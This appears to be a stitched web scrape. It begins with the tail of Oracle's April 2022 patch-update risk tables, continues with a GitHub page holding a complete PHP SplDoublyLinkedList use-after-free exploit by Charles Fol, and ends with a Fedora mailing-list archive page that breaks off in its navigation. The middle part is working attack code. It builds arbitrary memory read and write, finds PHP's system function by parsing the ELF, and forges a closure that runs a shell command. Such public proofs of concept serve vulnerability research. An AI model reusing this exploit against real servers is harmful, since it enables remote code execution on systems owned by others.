| Base Score | Attack Vector | Attack Complex | Privs Req'd | User Interact | Scope | Confid- entiality | Inte- grity | Avail- ability |
| CVE-2021-30129 | OSS Support Tools | Diagnostic Assistant (Apache MINA SSHD) | HTTP | No | 6.5 | Network | Low | Low | None | Un- changed | None | None | High | 2.12.42 |  |
| CVE-2021-41973 | OSS Support Tools | Diagnostic Assistant (Apache MINA) | HTTP | Yes | 6.5 | Network | Low | None | Required | Un- changed | None | None | High | 2.12.42 |  |
| CVE-2022-21405 | OSS Support Tools | Oracle Explorer | None | No | 5.5 | Local | Low | High | Required | Changed | High | None | None | 18.3 |  |

#### Oracle Systems Risk Matrix

This Critical Patch Update contains 20 new security patches for Oracle Systems.  14 of these vulnerabilities may be remotely exploitable without authentication, i.e., may be exploited over a network without requiring user credentials.  The English text form of this Risk Matrix can be found [here.](/security-alerts/cpuapr2022verbose.html#SUNS)

| CVE# | Product | Component | Protocol | Remote Exploit without Auth.? | CVSS VERSION 3.1 RISK (see [Risk Matrix Definitions](/security-alerts/advisorymatrixglossary.html)) | | | | | | | | | Supported Versions Affected | Notes |
| --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- |
| Base Score | Attack Vector | Attack Complex | Privs Req'd | User Interact | Scope | Confid- entiality | Inte- grity | Avail- ability |
| CVE-2019-17195 | Oracle Solaris Cluster | Tools (Nimbus JOSE+JWT) | HTTP | Yes | 9.8 | Network | Low | None | None | Un- changed | High | High | High | 4 |  |
| CVE-2021-39275 | Oracle ZFS Storage Appliance Kit | Operating System Image | Multiple | Yes | 9.8 | Network | Low | None | None | Un- changed | High | High | High | 8.8 |  |
| CVE-2021-2351 | Oracle StorageTek ACSLS | Software (JDBC) | Oracle Net | Yes | 8.3 | Network | High | None | Required | Changed | High | High | High | 8.5.1 |  |
| CVE-2021-2351 | Oracle StorageTek Tape Analytics (STA) | Application Server (JDBC) | Oracle Net | Yes | 8.3 | Network | High | None | Required | Changed | High | High | High | 2.4 |  |
| CVE-2022-21446 | Oracle Solaris | Utility | Multiple | Yes | 8.2 | Network | Low | None | None | Un- changed | Low | High | None | 11 |  |
| CVE-2020-11979 | Oracle StorageTek ACSLS | Software (Apache Ant) | HTTP | Yes | 7.5 | Network | Low | None | None | Un- changed | None | High | None | 8.5.1 |  |
| CVE-2020-11979 | Oracle StorageTek Tape Analytics (STA) | Core (Apache Ant) | HTTP | Yes | 7.5 | Network | Low | None | None | Un- changed | None | High | None | 2.4 |  |
| CVE-2020-6950 | Oracle Solaris Cluster | Tools (Eclipse Mojarra) | HTTP | Yes | 6.5 | Network | Low | None | Required | Un- changed | High | None | None | 4 |  |
| CVE-2020-5421 | Oracle StorageTek ACSLS | Software (Spring Framework) | HTTP | No | 6.5 | Network | High | Low | Required | Changed | Low | High | None | 8.5.1 |  |
| CVE-2019-3740 | Oracle StorageTek ACSLS | Software (RSA BSAFE Crypto-J) | HTTPS | Yes | 6.5 | Network | Low | None | Required | Un- changed | High | None | None | 8.5.1 |  |
| CVE-2020-11022 | Oracle StorageTek ACSLS | Software (jQuery) | HTTP | Yes | 6.1 | Network | Low | None | Required | Changed | Low | Low | None | 8.5.1 |  |
| CVE-2022-21493 | Oracle Solaris | Kernel | None | No | 5.9 | Local | Low | Low | Required | Changed | None | None | High | 11 |  |
| CVE-2022-21461 | Oracle Solaris | Kernel | None | No | 5.5 | Local | Low | Low | None | Un- changed | High | None | None | 11 |  |
| CVE-2022-21463 | Oracle Solaris | Kernel | None | No | 5.5 | Local | Low | Low | None | Un- changed | None | None | High | 11 |  |
| CVE-2022-21416 | Oracle Solaris | Utility | None | No | 5.0 | Local | Low | Low | Required | Un- changed | None | High | None | 11 |  |
| CVE-2021-29425 | Oracle Solaris Cluster | Tools (Apache Commons IO) | HTTP | Yes | 4.8 | Network | High | None | None | Un- changed | Low | Low | None | 4 |  |
| CVE-2022-21494 | Oracle Solaris | Kernel | None | No | 4.0 | Local | High | High | Required | Un- changed | None | None | High | 11 |  |
| CVE-2020-1968 | Oracle Ethernet Switch ES1-24 | Firmware (OpenSSL) | HTTPS | Yes | 3.7 | Network | High | None | None | Un- changed | Low | None | None | 1.3.1 |  |
| CVE-2020-1968 | Oracle Ethernet Switch TOR-72 | Firmware (OpenSSL) | HTTPS | Yes | 3.7 | Network | High | None | None | Un- changed | Low | None | None | 1.2.2 |  |
| CVE-2020-9488 | Oracle StorageTek ACSLS | Software (Apache Log4j) | HTTP | Yes | 3.7 | Network | High | None | None | Un- changed | Low | None | None | 8.5.1 |  |

#### Additional CVEs addressed are:

* The patch for CVE-2019-3740 also addresses CVE-2019-3738, and CVE-2019-3739.
* The patch for CVE-2020-11022 also addresses CVE-2020-11023.
* The patch for CVE-2021-39275 also addresses CVE-2019-13038, CVE-2019-14822, CVE-2021-25219, CVE-2021-33193, CVE-2021-34798, CVE-2021-36160, CVE-2021-4034, CVE-2021-40438, CVE-2021-41617, CVE-2021-4181, CVE-2021-4182, CVE-2021-4183, CVE-2021-4184, CVE-2021-4185, CVE-2021-42717, CVE-2021-43395, CVE-2021-43818, CVE-2021-44224, CVE-2021-44790, CVE-2022-0391, CVE-2022-0778, CVE-2022-21271, CVE-2022-21375, CVE-2022-21446, CVE-2022-21461, CVE-2022-21463, CVE-2022-21493, CVE-2022-21494, CVE-2022-21716, CVE-2022-22719, CVE-2022-22720, CVE-2022-22721, CVE-2022-23943, CVE-2022-25235, CVE-2022-25236, CVE-2022-25313, CVE-2022-25314, and CVE-2022-25315.

#### Oracle Taleo Risk Matrix

This Critical Patch Update contains 1 new security patch for Oracle Taleo.  This vulnerability is not remotely exploitable without authentication, i.e., may not be exploited over a network without requiring user credentials.  The English text form of this Risk Matrix can be found [here.](/security-alerts/cpuapr2022verbose.html#TLEO)

| CVE# | Product | Component | Protocol | Remote Exploit without Auth.? | CVSS VERSION 3.1 RISK (see [Risk Matrix Definitions](/security-alerts/advisorymatrixglossary.html)) | | | | | | | | | Supported Versions Affected | Notes |
| --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- |
| Base Score | Attack Vector | Attack Complex | Privs Req'd | User Interact | Scope | Confid- entiality | Inte- grity | Avail- ability |
| CVE-2021-44832 | Oracle Taleo Platform | Taleo Connect Client Installer (Apache Log4j) | HTTP | No | 6.6 | Network | High | High | None | Un- changed | High | High | High | Prior to 22.1 |  |

#### Oracle Utilities Applications Risk Matrix

This Critical Patch Update contains 1 new security patch for Oracle Utilities Applications.  This vulnerability is not remotely exploitable without authentication, i.e., may not be exploited over a network without requiring user credentials.  The English text form of this Risk Matrix can be found [here.](/security-alerts/cpuapr2022verbose.html#UTIL)

| CVE# | Product | Component | Protocol | Remote Exploit without Auth.? | CVSS VERSION 3.1 RISK (see [Risk Matrix Definitions](/security-alerts/advisorymatrixglossary.html)) | | | | | | | | | Supported Versions Affected | Notes |
| --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- |
| Base Score | Attack Vector | Attack Complex | Privs Req'd | User Interact | Scope | Confid- entiality | Inte- grity | Avail- ability |
| CVE-2021-44832 | Oracle Utilities Framework | General (Apache Log4j) | HTTP | No | 6.6 | Network | High | High | None | Un- changed | High | High | High | 4.3.0.1.0-4.3.0.6.0, 4.4.0.0.0, 4.4.0.2.0, 4.4.0.3.0 |  |

#### Oracle Virtualization Risk Matrix

This Critical Patch Update contains 6 new security patches for Oracle Virtualization.  1 of these vulnerabilities may be remotely exploitable without authentication, i.e., may be exploited over a network without requiring user credentials.  The English text form of this Risk Matrix can be found [here.](/security-alerts/cpuapr2022verbose.html#OVIR)

| CVE# | Product | Component | Protocol | Remote Exploit without Auth.? | CVSS VERSION 3.1 RISK (see [Risk Matrix Definitions](/security-alerts/advisorymatrixglossary.html)) | | | | | | | | | Supported Versions Affected | Notes |
| --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- |
| Base Score | Attack Vector | Attack Complex | Privs Req'd | User Interact | Scope | Confid- entiality | Inte- grity | Avail- ability |
| CVE-2021-40438 | Oracle Secure Global Desktop | Web Server (Apache HTTP Server) | HTTP | Yes | 9.0 | Network | High | None | None | Changed | High | High | High | 5.6 |  |
| CVE-2022-21491 | Oracle VM VirtualBox | Core | None | No | 7.8 | Local | Low | Low | None | Un- changed | High | High | High | Prior to 6.1.34 | See Note 1 |
| CVE-2022-21465 | Oracle VM VirtualBox | Core | None | No | 6.7 | Local | Low | High | None | Changed | None | Low | High | Prior to 6.1.34 |  |
| CVE-2022-21471 | Oracle VM VirtualBox | Core | None | No | 6.5 | Local | Low | Low | None | Changed | None | None | High | Prior to 6.1.34 |  |
| CVE-2022-21487 | Oracle VM VirtualBox | Core | None | No | 3.8 | Local | Low | Low | None | Changed | Low | None | None | Prior to 6.1.34 |  |
| CVE-2022-21488 | Oracle VM VirtualBox | Core | None | No | 3.8 | Local | Low | Low | None | Changed | None | Low | None | Prior to 6.1.34 |  |

#### Notes:

1. This vulnerability applies to Windows systems only.

Resources for

* [Careers](/careers/)
* [Developers](/developer/)
* [Investors](https://investor.oracle.com/home/default.aspx)
* [Partners](/partner/)
* [Researchers](/research/)
* [Students and Educators](https://academy.oracle.com/en/oa-web-overview.html)

Why Oracle

* [Analyst Reports](/corporate/analyst-reports/)
* [Best cloud-based
  ERP](/erp/what-is-erp/best-erp/)
* [Cloud Economics](/cloud/economics/)
* [Social Impact](/social-impact/)
* [Culture and Inclusion](/careers/diversity-inclusion/)
* [Security Practices](/corporate/security-practices/)

Learn

* [What is cloud
  computing?](/cloud/what-is-cloud-computing/)
* [What is CRM?](/cx/what-is-crm/)
* [What is
  Docker?](/cloud/cloud-native/container-registry/what-is-docker/)
* [What is
  Kubernetes?](/cloud/cloud-native/kubernetes-engine/what-is-kubernetes/)
* [What is
  Python?](/developer/what-is-python-for-developers/)
* [What is SaaS?](/applications/what-is-saas/)

News and Events

* [News](/news/)
* [Oracle CloudWorld](/cloudworld/)
* [Oracle CloudWorld Tour](/cloudworld-tour/)
* [Oracle Health Summit](/health/health-summit/)
* [Oracle Dev Tour](/developer/dev-tour/)
* [Search all events](https://search.oracle.com/events?q=&lang=english)

Contact Us

* US Sales: +1.800.633.0738
* [How can we help?](/corporate/contact/)
* [Subscribe to emails](https://go.oracle.com/subscribe/?l_code=en&src1=OW:O:FO)
* [Integrity Helpline](https://secure.ethicspoint.com/domain/media/en/gui/31053/index.html)
* [Accessibility](/corporate/accessibility/)

---

* [Country/Region](/universal-menu/#u10countrymenu)

* [© 2025 Oracle](/legal/copyright/)
* [Privacy](/legal/privacy/)/[Do Not Sell My
  Info](/legal/privacy/privacy-choices/)
* [Ad
  Choices](/legal/privacy/privacy-policy/#adchoices)
* [Careers](/corporate/careers/)



=== Content from github.com_c992cd73_20250115_115348.html ===

[Skip to content](#start-of-content)

## Navigation Menu

Toggle navigation

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Fcfreal%2Fexploits%2Fblob%2Fmaster%2Fphp-SplDoublyLinkedList-offsetUnset%2Fexploit.php)

* Product

  + [GitHub Copilot
    Write better code with AI](https://github.com/features/copilot)
  + [Security
    Find and fix vulnerabilities](https://github.com/features/security)
  + [Actions
    Automate any workflow](https://github.com/features/actions)
  + [Codespaces
    Instant dev environments](https://github.com/features/codespaces)
  + [Issues
    Plan and track work](https://github.com/features/issues)
  + [Code Review
    Manage code changes](https://github.com/features/code-review)
  + [Discussions
    Collaborate outside of code](https://github.com/features/discussions)
  + [Code Search
    Find more, search less](https://github.com/features/code-search)

  Explore
  + [All features](https://github.com/features)
  + [Documentation](https://docs.github.com)
  + [GitHub Skills](https://skills.github.com)
  + [Blog](https://github.blog)
* Solutions

  By company size
  + [Enterprises](https://github.com/enterprise)
  + [Small and medium teams](https://github.com/team)
  + [Startups](https://github.com/enterprise/startups)
  By use case
  + [DevSecOps](/solutions/use-case/devsecops)
  + [DevOps](/solutions/use-case/devops)
  + [CI/CD](/solutions/use-case/ci-cd)
  + [View all use cases](/solutions/use-case)

  By industry
  + [Healthcare](/solutions/industry/healthcare)
  + [Financial services](/solutions/industry/financial-services)
  + [Manufacturing](/solutions/industry/manufacturing)
  + [Government](/solutions/industry/government)
  + [View all industries](/solutions/industry)

  [View all solutions](/solutions)
* Resources

  Topics
  + [AI](/resources/articles/ai)
  + [DevOps](/resources/articles/devops)
  + [Security](/resources/articles/security)
  + [Software Development](/resources/articles/software-development)
  + [View all](/resources/articles)

  Explore
  + [Learning Pathways](https://resources.github.com/learn/pathways)
  + [White papers, Ebooks, Webinars](https://resources.github.com)
  + [Customer Stories](https://github.com/customer-stories)
  + [Partners](https://partner.github.com)
  + [Executive Insights](https://github.com/solutions/executive-insights)
* Open Source

  + [GitHub Sponsors
    Fund open source developers](/sponsors)
  + [The ReadME Project
    GitHub community articles](https://github.com/readme)
  Repositories
  + [Topics](https://github.com/topics)
  + [Trending](https://github.com/trending)
  + [Collections](https://github.com/collections)
* Enterprise

  + [Enterprise platform
    AI-powered developer platform](/enterprise)
  Available add-ons
  + [Advanced Security
    Enterprise-grade security features](https://github.com/enterprise/advanced-security)
  + [GitHub Copilot
    Enterprise-grade AI features](/features/copilot#enterprise)
  + [Premium Support
    Enterprise-grade 24/7 support](/premium-support)
* [Pricing](https://github.com/pricing)

Search or jump to...

# Search code, repositories, users, issues, pull requests...

Search

Clear

[Search syntax tips](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax)

# Provide feedback

We read every piece of feedback, and take your input very seriously.

Include my email address so I can be contacted

  Cancel

 Submit feedback

# Saved searches

## Use saved searches to filter your results more quickly

Name

Query

To see all available qualifiers, see our [documentation](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax).

  Cancel

 Create saved search

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Fcfreal%2Fexploits%2Fblob%2Fmaster%2Fphp-SplDoublyLinkedList-offsetUnset%2Fexploit.php)

[Sign up](/signup?ref_cta=Sign+up&ref_loc=header+logged+out&ref_page=%2F%3Cuser-name%3E%2F%3Crepo-name%3E%2Fblob%2Fshow&source=header-repo&source_repo=cfreal%2Fexploits)
Reseting focus

You signed in with another tab or window. Reload to refresh your session.
You signed out in another tab or window. Reload to refresh your session.
You switched accounts on another tab or window. Reload to refresh your session.

Dismiss alert

{{ message }}

[cfreal](/cfreal)
/
**[exploits](/cfreal/exploits)**
Public

* [Notifications](/login?return_to=%2Fcfreal%2Fexploits) You must be signed in to change notification settings
* [Fork
  161](/login?return_to=%2Fcfreal%2Fexploits)
* [Star
   574](/login?return_to=%2Fcfreal%2Fexploits)

* [Code](/cfreal/exploits)
* [Issues
  2](/cfreal/exploits/issues)
* [Pull requests
  0](/cfreal/exploits/pulls)
* [Actions](/cfreal/exploits/actions)
* [Projects
  0](/cfreal/exploits/projects)
* [Security](/cfreal/exploits/security)
* [Insights](/cfreal/exploits/pulse)

Additional navigation options

* [Code](/cfreal/exploits)
* [Issues](/cfreal/exploits/issues)
* [Pull requests](/cfreal/exploits/pulls)
* [Actions](/cfreal/exploits/actions)
* [Projects](/cfreal/exploits/projects)
* [Security](/cfreal/exploits/security)
* [Insights](/cfreal/exploits/pulse)

## Files

 master
## Breadcrumbs

1. [exploits](/cfreal/exploits/tree/master)
2. /[php-SplDoublyLinkedList-offsetUnset](/cfreal/exploits/tree/master/php-SplDoublyLinkedList-offsetUnset)
/
# exploit.php

Copy path Blame  Blame
## Latest commit

## History

[History](/cfreal/exploits/commits/master/php-SplDoublyLinkedList-offsetUnset/exploit.php)327 lines (283 loc) · 10.8 KB master
## Breadcrumbs

1. [exploits](/cfreal/exploits/tree/master)
2. /[php-SplDoublyLinkedList-offsetUnset](/cfreal/exploits/tree/master/php-SplDoublyLinkedList-offsetUnset)
/
# exploit.php

Top
## File metadata and controls

* Code
* Blame

327 lines (283 loc) · 10.8 KB[Raw](https://github.com/cfreal/exploits/raw/refs/heads/master/php-SplDoublyLinkedList-offsetUnset/exploit.php)123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198199200201202203204205206207208209210211212213214215216217218219220221222223224225226227228229230231232233234235236237238239240241242243244245246247248249250251252253254255256257258259260261262263264265266267268269270271272273274275276277278279280281282283284285286287288289290291292293294295296297298299300301302303304305306307308309310311312313314315316317318319320321322323324325326327<?php## PHP SplDoublyLinkedList::offsetUnset UAF# Charles Fol (@cfreal\_)# 2020-08-07# PHP is vulnerable from 5.3 to 8.0 alpha# This exploit only targets PHP7+.## SplDoublyLinkedList is a doubly-linked list (DLL) which supports iteration.# Said iteration is done by keeping a pointer to the "current" DLL element.# You can then call next() or prev() to make the DLL point to another element.# When you delete an element of the DLL, PHP will remove the element from the# DLL, then destroy the zval, and finally clear the current ptr if it points# to the element. Therefore, when the zval is destroyed, current is still# pointing to the associated element, even if it was removed from the list.# This allows for an easy UAF, because you can call $dll->next() or# $dll->prev() in the zval's destructor.# #
error\_reporting(E\_ALL);define('NB\_DANGLING', 200);define('SIZE\_ELEM\_STR', 40 - 24 - 1);define('STR\_MARKER', 0xcf5ea1);
function i2s(&$s, $p, $i, $x=8){ for($j=0;$j<$x;$j++) { $s[$p+$j] = chr($i & 0xff); $i >>= 8; }}
function s2i(&$s, $p, $x=8){ $i = 0; for($j=$x-1;$j>=0;$j--) { $i <<= 8; $i |= ord($s[$p+$j]); } return $i;}
class UAFTrigger{ function \_\_destruct() { global $dlls, $strs, $rw\_dll, $fake\_dll\_element, $leaked\_str\_offsets; #"print('UAF \_\_destruct: ' . "\n"); $dlls[NB\_DANGLING]->offsetUnset(0);  # At this point every $dll->current points to the same freed chunk. We allocate # that chunk with a string, and fill the zval part  $fake\_dll\_element = str\_shuffle(str\_repeat('A', SIZE\_ELEM\_STR)); i2s($fake\_dll\_element, 0x00, 0x12345678); # ptr i2s($fake\_dll\_element, 0x08, 0x00000004, 7); # type + other stuff  # Each of these dlls current->next pointers point to the same location, # the string we allocated. When calling next(), our fake element becomes # the current value, and as such its rc is incremented. Since rc is at # the same place as zend\_string.len, the length of the string gets bigger, # allowing to R/W any part of the following memory
 for($i = 0; $i <= NB\_DANGLING; $i++) $dlls[$i]->next();
 if(strlen($fake\_dll\_element) <= SIZE\_ELEM\_STR) die('Exploit failed: fake\_dll\_element did not increase in size');  $leaked\_str\_offsets = []; $leaked\_str\_zval = [];
 # In the memory after our fake element, that we can now read and write, # there are lots of zend\_string chunks that we allocated. We keep three, # and we keep track of their offsets.
 for($offset = SIZE\_ELEM\_STR + 1; $offset <= strlen($fake\_dll\_element) - 40; $offset += 40) { # If we find a string marker, pull it from the string list if(s2i($fake\_dll\_element, $offset + 0x18) == STR\_MARKER) { $leaked\_str\_offsets[] = $offset; $leaked\_str\_zval[] = $strs[s2i($fake\_dll\_element, $offset + 0x20)]; if(count($leaked\_str\_zval) == 3) break; } }  if(count($leaked\_str\_zval) != 3) die('Exploit failed: unable to leak three zend\_strings');  # free the strings, except the three we need $strs = null;
 # Leak adress of first chunk unset($leaked\_str\_zval[0]); unset($leaked\_str\_zval[1]); unset($leaked\_str\_zval[2]);
 $first\_chunk\_addr = s2i($fake\_dll\_element, $leaked\_str\_offsets[1]); # At this point we have 3 freed chunks of size 40, which we can read/write, # and we know their address. print('Address of first RW chunk: 0x' . dechex($first\_chunk\_addr) . "\n");
 # In the third one, we will allocate a DLL element which points to a zend\_array $rw\_dll->push([3]); $array\_addr = s2i($fake\_dll\_element, $leaked\_str\_offsets[2] + 0x18);
 # Change the zval type from zend\_object to zend\_string i2s($fake\_dll\_element, $leaked\_str\_offsets[2] + 0x20, 0x00000006);
 if(gettype($rw\_dll[0]) != 'string') die('Exploit failed: Unable to change zend\_array to zend\_string');  # We can now read anything: if we want to read 0x11223300, we make zend\_string\* # point to 0x11223300-0x10, and read its size using strlen() # Read zend\_array->pDestructor $zval\_ptr\_dtor\_addr = read($array\_addr + 0x30);  print('Leaked zval\_ptr\_dtor address: 0x' . dechex($zval\_ptr\_dtor\_addr) . "\n");
 # Use it to find zif\_system $system\_addr = get\_system\_address($zval\_ptr\_dtor\_addr); print('Got PHP\_FUNCTION(system): 0x' . dechex($system\_addr) . "\n");  # In the second freed block, we create a closure and copy the zend\_closure struct # to a string $rw\_dll->push(function ($x) {}); $closure\_addr = s2i($fake\_dll\_element, $leaked\_str\_offsets[1] + 0x18); $data = str\_shuffle(str\_repeat('A', 0x200)); for($i = 0; $i < 0x138; $i += 8) { i2s($data, $i, read($closure\_addr + $i)); }  # Change internal func type and pointer to make the closure execute system instead i2s($data, 0x38, 1, 4); i2s($data, 0x68, $system\_addr);  # Push our string, which contains a fake zend\_closure, in the last freed chunk that # we control, and make the second zval point to it. $rw\_dll->push($data); $fake\_zend\_closure = s2i($fake\_dll\_element, $leaked\_str\_offsets[0] + 0x18) + 24; i2s($fake\_dll\_element, $leaked\_str\_offsets[1] + 0x18, $fake\_zend\_closure); print('Replaced zend\_closure by the fake one: 0x' . dechex($fake\_zend\_closure) . "\n");  # Calling it now  print('Running system("id");' . "\n"); $rw\_dll[1]('id'); print\_r('DONE'."\n"); }}
class DanglingTrigger{ function \_\_construct($i) { $this->i = $i; }
 function \_\_destruct() { global $dlls; #D print('\_\_destruct: ' . $this->i . "\n"); $dlls[$this->i]->offsetUnset(0); $dlls[$this->i+1]->push(123); $dlls[$this->i+1]->offsetUnset(0); }}
class SystemExecutor extends ArrayObject{ function offsetGet($x) { parent::offsetGet($x); }}
/\*\* \* Reads an arbitrary address by changing a zval to point to the address minus 0x10, \* and setting its type to zend\_string, so that zend\_string->len points to the value \* we want to read. \*/function read($addr, $s=8){ global $fake\_dll\_element, $leaked\_str\_offsets, $rw\_dll; i2s($fake\_dll\_element, $leaked\_str\_offsets[2] + 0x18, $addr - 0x10); i2s($fake\_dll\_element, $leaked\_str\_offsets[2] + 0x20, 0x00000006); $value = strlen($rw\_dll[0]); if($s != 8) $value &= (1 << ($s << 3)) - 1; return $value;}
function get\_binary\_base($binary\_leak){ $base = 0; $start = $binary\_leak & 0xfffffffffffff000; for($i = 0; $i < 0x1000; $i++) { $addr = $start - 0x1000 \* $i; $leak = read($addr, 7); # ELF header if($leak == 0x10102464c457f) return $addr; } # We'll crash before this but it's clearer this way die('Exploit failed: Unable to find ELF header');}
function parse\_elf($base){ $e\_type = read($base + 0x10, 2); $e\_phoff = read($base + 0x20); $e\_phentsize = read($base + 0x36, 2); $e\_phnum = read($base + 0x38, 2); for($i = 0; $i < $e\_phnum; $i++) { $header = $base + $e\_phoff + $i \* $e\_phentsize; $p\_type = read($header + 0x00, 4); $p\_flags = read($header + 0x04, 4); $p\_vaddr = read($header + 0x10); $p\_memsz = read($header + 0x28); if($p\_type == 1 && $p\_flags == 6) { # PT\_LOAD, PF\_Read\_Write # handle pie $data\_addr = $e\_type == 2 ? $p\_vaddr : $base + $p\_vaddr; $data\_size = $p\_memsz; } else if($p\_type == 1 && $p\_flags == 5) { # PT\_LOAD, PF\_Read\_exec $text\_size = $p\_memsz; } } if(!$data\_addr || !$text\_size || !$data\_size) die('Exploit failed: Unable to parse ELF'); return [$data\_addr, $text\_size, $data\_size];}
function get\_basic\_funcs($base, $elf) { list($data\_addr, $text\_size, $data\_size) = $elf; for($i = 0; $i < $data\_size / 8; $i++) { $leak = read($data\_addr + $i \* 8); if($leak - $base > 0 && $leak < $data\_addr) { $deref = read($leak); # 'constant' constant check if($deref != 0x746e6174736e6f63) continue; } else continue; $leak = read($data\_addr + ($i + 4) \* 8); if($leak - $base > 0 && $leak < $data\_addr) { $deref = read($leak); # 'bin2hex' constant check if($deref != 0x786568326e6962) continue; } else continue; return $data\_addr + $i \* 8; }}
function get\_system($basic\_funcs){ $addr = $basic\_funcs; do { $f\_entry = read($addr); $f\_name = read($f\_entry, 6); if($f\_name == 0x6d6574737973) { # system return read($addr + 8); } $addr += 0x20; } while($f\_entry != 0); return false;}
function get\_system\_address($binary\_leak){ $base = get\_binary\_base($binary\_leak); print('ELF base: 0x' .dechex($base) . "\n"); $elf = parse\_elf($base); $basic\_funcs = get\_basic\_funcs($base, $elf); print('Basic functions: 0x' .dechex($basic\_funcs) . "\n"); $zif\_system = get\_system($basic\_funcs); return $zif\_system;}
# This is to force PHP to output headers, thus avoiding unexpected allocationsprint('Exploit starts.');
$dlls = [];$strs = [];$rw\_dll = new SplDoublyLinkedList();
# Create a chain of dangling triggers, which will all in turn# free current->next, push an element to the next list, and free current# This will make sure that every current->next points the same memory block,# which we will UAF.for($i = 0; $i < NB\_DANGLING; $i++){ $dlls[$i] = new SplDoublyLinkedList(); $dlls[$i]->push(new DanglingTrigger($i)); $dlls[$i]->rewind();}
# We want our UAF'd list element to be before two strings, so that we can# obtain the address of the first string, and increase is size. We then have# R/W over all memory after the obtained address.define('NB\_STRS', 50);for($i = 0; $i < NB\_STRS; $i++){ $strs[] = str\_shuffle(str\_repeat('A', SIZE\_ELEM\_STR)); i2s($strs[$i], 0, STR\_MARKER); i2s($strs[$i], 8, $i, 7);}
# Free one string in the middle, ...$strs[(int) (NB\_STRS / 2)] = 123;
# ... and put the to-be-UAF'd list element instead.$dlls[0]->push(0);
# Setup the last DLlist, which will exploit the UAF$dlls[NB\_DANGLING] = new SplDoublyLinkedList();$dlls[NB\_DANGLING]->push(new UAFTrigger());$dlls[NB\_DANGLING]->rewind();
# Trigger the bug on the first list$dlls[0]->offsetUnset(0);

## Footer

© 2025 GitHub, Inc.

### Footer navigation

* [Terms](https://docs.github.com/site-policy/github-terms/github-terms-of-service)
* [Privacy](https://docs.github.com/site-policy/privacy-policies/github-privacy-statement)
* [Security](https://github.com/security)
* [Status](https://www.githubstatus.com/)
* [Docs](https://docs.github.com/)
* [Contact](https://support.github.com?tags=dotcom-footer)
* Manage cookies
* Do not share my personal information

You can’t perform that action at this time.



=== Content from lists.fedoraproject.org_3c4c83cf_20250114_195333.html ===


[![Fedora Mailing-Lists](/static/logo-hyperkitty-fedora.png)](/archives/ "Fedora Mailing-Lists")

[Sign In](/accounts/login/?next=/archives/list/package-announce%40lists.fedoraproject.org/message/JO5RA6YOBGGGKLIA6F6BQRZDDECF5L3R/)
[Sign Up](/accounts/signup/?next=/archives/list/package-announce%40lists.fedoraproject.org/message/JO5RA6YOBGGGKLIA6F6BQRZDDECF5L3R/)

* [Sign In](/accounts/login/?next=/archives/list/package-announce%40lists.fedoraproject.org/message/JO5RA6YOBGGGKLIA6F6BQRZDDECF5L3R/)
* [Sign Up](/accounts/signup/?next=/archives/list/package-announce%40lists.fedoraproject.org/message/JO5RA6YOBGGGKLIA6F6BQRZDDECF5L3R/)

* [Manage this list](/admin/lists/package-announce.lists.fedoraproject.org/)

×
#### Keyboard Shortcuts

### Thread View

* `j`: Next unread message
* `k`: Previous unread message
* `j a`: Jump to all threads* `j l`: Jump to MailingList overview

### 2025

* [January](/archives/list/package-announce%40lists.fedoraproject.org/2025/1/)

### 2024

* [December](/archives/list/package-announce%40lists.fedoraproject.org/2024/12/)
* [November](/archives/list/package-announce%40lists.fedoraproject.org/2024/11/)
* [October](/archives/list/package-announce%40lists.fedoraproject.org/2024/10/)
* [September](/archives/list/package-announce%40lists.fedoraproject.org/2024/9/)
* [August](/archives/list/package-announce%40lists.fedoraproject.org/2024/8/)
* [July](/archives/list/package-announce%40lists.fedoraproject.org/2024/7/)
* [June](/archives/list/package-announce%40lists.fedoraproject.org/2024/6/)
* [May](/archives/list/package-announce%40lists.fedoraproject.org/2024/5/)
* [April](/archives/list/package-announce%40lists.fedoraproject.org/2024/4/)
* [March](/archives/list/package-announce%40lists.fedoraproject.org/2024/3/)
* [February](/archives/list/package-announce%40lists.fedoraproject.org/2024/2/)
* [January](/archives/list/package-announce%40lists.fedoraproject.org/2024/1/)

### 2023

* [December](/archives/list/package-announce%40lists.fedoraproject.org/2023/12/)
* [November](/archives/list/package-announce%40lists.fedoraproject.org/2023/11/)
* [October](/archives/list/package-announce%40lists.fedoraproject.org/2023/10/)
* [September](/archives/list/package-announce%40lists.fedoraproject.org/2023/9/)
* [August](/archives/list/package-announce%40lists.fedoraproject.org/2023/8/)
* [July](/archives/list/package-announce%40lists.fedoraproject.org/2023/7/)
* [June](/archives/list/package-announce%40lists.fedoraproject.org/2023/6/)
* [May](/archives/list/package-announce%40lists.fedoraproject.org/2023/5/)
* [April](/archives/list/package-announce%40lists.fedoraproject.org/2023/4/)
* [March](/archives/list/package-announce%40lists.fedoraproject.org/2023/3/)
* [February](/archives/list/package-announce%40lists.fedoraproject.org/2023/2/)
* [January](/archives/list/package-announce%40lists.fedoraproject.org/2023/1/)

### 2022

* [December](/archives/list/package-announce%40lists.fedoraproject.org/2022/12/)
* [November](/archives/list/package-announce%40lists.fedoraproject.org/2022/11/)
* [October](/archives/list/package-announce%40lists.fedoraproject.org/2022/10/)
* [September](/archives/list/package-announce%40lists.fedoraproject.org/2022/9/)
* [August](/archives/list/package-announce%40lists.fedoraproject.org/2022/8/)
* [July](/archives/list/package-announce%40lists.fedoraproject.org/2022/7/)
* [June](/archives/list/package-announce%40lists.fedoraproject.org/2022/6/)
* [May](/archives/list/package-announce%40lists.fedoraproject.org/2022/5/)
* [April](/archives/list/package-announce%40lists.fedoraproject.org/2022/4/)
* [March](/archives/list/package-announce%40lists.fedoraproject.org/2022/3/)
* [February](/archives/list/package-announce%40lists.fedoraproject.org/2022/2/)
* [January](/archives/list/package-announce%40lists.fedoraproject.org/2022/1/)

### 2021

